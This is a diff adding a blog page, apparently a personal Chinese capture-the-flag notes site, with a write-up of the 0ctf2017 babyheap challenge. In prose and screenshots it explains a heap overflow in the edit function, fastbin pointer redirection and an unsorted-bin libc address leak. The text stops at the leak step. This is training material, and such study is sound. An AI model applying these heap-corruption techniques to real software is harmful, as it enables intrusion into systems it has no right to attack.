@@ -1,0 +1,1412 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/pwn-notes/img/fluid.png">
+  <link rel="icon" href="/pwn-notes/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="henan808">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="看ai说只是修改两个小堆块，修改其中一个的size之后释放，使得两个小堆块进入unsortedbin 之后再次申请小的，其中一个被取出，另一个仍在unsortedbin中，之后查看内容，其fd和bk即是原始的数据区，当然是另一个小堆块，即可泄露出libc的相关地址  保护全开，或许堆题查看保护只是看它是多少位的 64位 ida查看关键函数  添加函数，限制size大小  编辑函数，这里可以自己">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf2017babyheap">
+<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-0ctf2017babyheap-9d78ba/index.html">
+<meta property="og:site_name" content="Pwn Notes">
+<meta property="og:description" content="看ai说只是修改两个小堆块，修改其中一个的size之后释放，使得两个小堆块进入unsortedbin 之后再次申请小的，其中一个被取出，另一个仍在unsortedbin中，之后查看内容，其fd和bk即是原始的数据区，当然是另一个小堆块，即可泄露出libc的相关地址  保护全开，或许堆题查看保护只是看它是多少位的 64位 ida查看关键函数  添加函数，限制size大小  编辑函数，这里可以自己">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261015182358632.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261015183255429.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261015183416440.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261015183508344.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261015183549246.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261016154035435.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261016154307970.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261016154400956.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261016154706416.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261016154911013.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017094927733.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017100847801.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017101946239.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017102121675.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017102510540.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017102748001.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017102952669.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017105427363.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017105709616.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017113215330.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017113229609.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017160122329.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017161110837.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017162351962.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017162507225.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017165018457.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017165222038.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017171305470.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017172724693.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017172815607.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017175018550.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017180053556.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017181703060.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261017181610483.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261025153237158.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261025153511815.png">
+<meta property="article:published_time" content="2026-11-13T11:08:05.000Z">
+<meta property="article:modified_time" content="2026-11-13T11:25:07.953Z">
+<meta property="article:author" content="henan808">
+<meta property="article:tag" content="unsorted-bin">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261015182358632.png">
+  
+  
+  
+  <title>0ctf2017babyheap - Pwn Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/pwn-notes/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/pwn-notes/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/pwn-notes/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"henan808.github.io","root":"/pwn-notes/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/pwn-notes/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/pwn-notes/js/utils.js" ></script>
+  <script  src="/pwn-notes/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/pwn-notes/">
+      <strong>Pwn Notes</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/pwn-notes/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0ctf2017babyheap"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        henan808
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-13 19:08" pubdate>
+          2026-11-13 19:08
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="题目复现"
+        id="heading-c24904fafdedd94cae3329cab43afa2f" role="tab" data-toggle="collapse" href="#collapse-c24904fafdedd94cae3329cab43afa2f"
+        aria-expanded="true"
+      >
+        题目复现
+        <span class="list-group-count">(13)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-c24904fafdedd94cae3329cab43afa2f"
+           role="tabpanel" aria-labelledby="heading-c24904fafdedd94cae3329cab43afa2f">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="0CTF"
+        id="heading-66ee23ad3c83a69ba427b948ca811936" role="tab" data-toggle="collapse" href="#collapse-66ee23ad3c83a69ba427b948ca811936"
+        aria-expanded="true"
+      >
+        0CTF
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-66ee23ad3c83a69ba427b948ca811936"
+           role="tabpanel" aria-labelledby="heading-66ee23ad3c83a69ba427b948ca811936">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-0ctf2017babyheap-9d78ba/" title="0ctf2017babyheap"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">0ctf2017babyheap</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CISCN"
+        id="heading-85d4b39991e6d793b4caecd8f57b316e" role="tab" data-toggle="collapse" href="#collapse-85d4b39991e6d793b4caecd8f57b316e"
+        aria-expanded="false"
+      >
+        CISCN
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-85d4b39991e6d793b4caecd8f57b316e"
+           role="tabpanel" aria-labelledby="heading-85d4b39991e6d793b4caecd8f57b316e">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ciscn2019final3</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/10/imported-ciscn_2019_final_3/" title="ciscn_2019_final_3"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ciscn_2019_final_3</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/ciscn-2019-final-3-leak-techniques/" title="ciscn_2019_final_3：四种流派怎么泄露 libc"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ciscn_2019_final_3：四种流派怎么泄露 libc</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HITCON"
+        id="heading-8f64721be0067542591093019292b028" role="tab" data-toggle="collapse" href="#collapse-8f64721be0067542591093019292b028"
+        aria-expanded="false"
+      >
+        HITCON
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8f64721be0067542591093019292b028"
+           role="tabpanel" aria-labelledby="heading-8f64721be0067542591093019292b028">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">hitcon2018childrentcache（off by null）</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcontrainingmagicheap-5861ae/" title="hitcontrainingmagicheap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">hitcontrainingmagicheap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcontraininguaf-8aa533/" title="hitcontraininguaf"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">hitcontraininguaf</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="RoarCTF"
+        id="heading-d25d9658953f4c8222b2c810b44b34c6" role="tab" data-toggle="collapse" href="#collapse-d25d9658953f4c8222b2c810b44b34c6"
+        aria-expanded="false"
+      >
+        RoarCTF
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-d25d9658953f4c8222b2c810b44b34c6"
+           role="tabpanel" aria-labelledby="heading-d25d9658953f4c8222b2c810b44b34c6">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/12/imported-roarctf2019_easyheap/" title="RoarCTF 2019] easyheap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">RoarCTF 2019] easyheap</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="V&amp;N"
+        id="heading-2cc4225f9e41bb83720f2a02687f6b3f" role="tab" data-toggle="collapse" href="#collapse-2cc4225f9e41bb83720f2a02687f6b3f"
+        aria-expanded="false"
+      >
+        V&amp;N
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-2cc4225f9e41bb83720f2a02687f6b3f"
+           role="tabpanel" aria-labelledby="heading-2cc4225f9e41bb83720f2a02687f6b3f">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-v-n2020-easytheap-8e50cf/" title="[V&amp;N2020 公开赛]easyTHeap（差一步美满）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">[V&amp;N2020 公开赛]easyTHeap（差一步美满）</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ZJCTF"
+        id="heading-8f47a34f247fa00f3cd88b8de2501992" role="tab" data-toggle="collapse" href="#collapse-8f47a34f247fa00f3cd88b8de2501992"
+        aria-expanded="false"
+      >
+        ZJCTF
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8f47a34f247fa00f3cd88b8de2501992"
+           role="tabpanel" aria-labelledby="heading-8f47a34f247fa00f3cd88b8de2501992">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-1-uaf-a9fd52/" title="1.UAF"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">1.UAF</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="how2heap"
+        id="heading-cb2e4d263aaf34eb3434a52d5117c509" role="tab" data-toggle="collapse" href="#collapse-cb2e4d263aaf34eb3434a52d5117c509"
+        aria-expanded="false"
+      >
+        how2heap
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-cb2e4d263aaf34eb3434a52d5117c509"
+           role="tabpanel" aria-labelledby="heading-cb2e4d263aaf34eb3434a52d5117c509">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/" title="HOW2HEAP"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HOW2HEAP</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="其他赛事"
+        id="heading-cc195e58b34754a13fcd0d59c782bfee" role="tab" data-toggle="collapse" href="#collapse-cc195e58b34754a13fcd0d59c782bfee"
+        aria-expanded="false"
+      >
+        其他赛事
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-cc195e58b34754a13fcd0d59c782bfee"
+           role="tabpanel" aria-labelledby="heading-cc195e58b34754a13fcd0d59c782bfee">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/12/imported-fmt_cache/" title="fmt_cache（格式化字符串 + FILE IO 缓存残留）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">fmt_cache（格式化字符串 + FILE IO 缓存残留）</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="单身杯"
+        id="heading-d62b9de8d540cf14d74f54922367027e" role="tab" data-toggle="collapse" href="#collapse-d62b9de8d540cf14d74f54922367027e"
+        aria-expanded="false"
+      >
+        单身杯
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-d62b9de8d540cf14d74f54922367027e"
+           role="tabpanel" aria-labelledby="heading-d62b9de8d540cf14d74f54922367027e">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-8350d48a-e9e857/" title="单身杯"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">单身杯</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">0ctf2017babyheap</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
+<!-- sync-source: notes/external/typora-pwn/pwn题目.md#6 -->
+<p>看ai说只是修改两个小堆块，修改其中一个的size之后释放，使得两个小堆块进入unsortedbin 之后再次申请小的，其中一个被取出，另一个仍在unsortedbin中，之后查看内容，其fd和bk即是原始的数据区，当然是另一个小堆块，即可泄露出libc的相关地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261015182358632.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261015182358632"></p>
+<p>保护全开，或许堆题查看保护只是看它是多少位的</p>
+<p>64位</p>
+<p>ida查看关键函数</p>
+<p><img src="/pwn-notes/images/notes/image-20261015183255429.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261015183255429"></p>
+<p>添加函数，限制size大小</p>
+<p><img src="/pwn-notes/images/notes/image-20261015183416440.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261015183416440"></p>
+<p>编辑函数，这里可以自己定义内容大小，应该可以堆溢出</p>
+<p><img src="/pwn-notes/images/notes/image-20261015183508344.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261015183508344"></p>
+<p>释放函数，指针清零，没有uaf啥的</p>
+<p><img src="/pwn-notes/images/notes/image-20261015183549246.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261015183549246"></p>
+<p>退出函数</p>
+<p>额，这么一想，好像查看保护也挺有用，这道题保护全开，嘶，也没有uaf。</p>
+<p>不对，保护全开，基址是变化的，所以需要泄露libc基址</p>
+<p>那么泄露完之后呢</p>
+<p><img src="/pwn-notes/images/notes/image-20261016154035435.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261016154035435"></p>
+<p>结构体呢？分配的堆块呢？</p>
+<p>那么再编辑一下内容</p>
+<p><img src="/pwn-notes/images/notes/image-20261016154307970.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261016154307970"></p>
+<p><img src="/pwn-notes/images/notes/image-20261016154400956.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261016154400956"></p>
+<p>这个倒是看起来挺正常的，就是挺干净的</p>
+<p><img src="/pwn-notes/images/notes/image-20261016154706416.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261016154706416"></p>
+<p>挺正常</p>
+<p>感觉可以直接dump出来</p>
+<p><img src="/pwn-notes/images/notes/image-20261016154911013.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261016154911013"></p>
+<p>哦，原来没有相关的指针了，被清零了。</p>
+<p>编辑函数中有堆溢出。怎么用？</p>
+<p>哦哦，修改小堆块的size之后，让他们进入unsortedbin</p>
+<p><img src="/pwn-notes/images/notes/image-20261017094927733.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017094927733"></p>
+<p>主要有5个堆块，第一个来进行溢出，使得第2个第3个进入fastbin之后，修改指针指向第5个堆块，之后</p>
+<p><img src="/pwn-notes/images/notes/image-20261017100847801.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017100847801"></p>
+<p><img src="/pwn-notes/images/notes/image-20261017101946239.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017101946239"></p>
+<p>写入位置，修改位置，修改位置的值</p>
+<p><img src="/pwn-notes/images/notes/image-20261017102121675.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017102121675"></p>
+<p>此时已经修改过来了，此时需要申请来再次指向这个chunk4,但是它处于的是0x20大小的列表中，所以还需要修改chunk4的大小。</p>
+<p>这个时候需要借助chunk3进行堆溢出修改</p>
+<p><img src="/pwn-notes/images/notes/image-20261017102510540.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017102510540"></p>
+<p>写入位置，修改的值</p>
+<p><img src="/pwn-notes/images/notes/image-20261017102748001.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017102748001"></p>
+<p>修改完成</p>
+<p>接下来申请。</p>
+<p><img src="/pwn-notes/images/notes/image-20261017102952669.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017102952669"></p>
+<p>此时列表中什么都没有，所以就是原来的2序号就是指向了chunk4</p>
+<p>但是4序号还是指向chunk4</p>
+<p>这时泄露libc地址，需要chunk4进入unsoretdbin,之后需要将chunk4的size改回去</p>
+<p><img src="/pwn-notes/images/notes/image-20261017105427363.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017105427363"></p>
+<p>释放</p>
+<p><img src="/pwn-notes/images/notes/image-20261017105709616.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017105709616"></p>
+<p>接下来借助chun2来泄露</p>
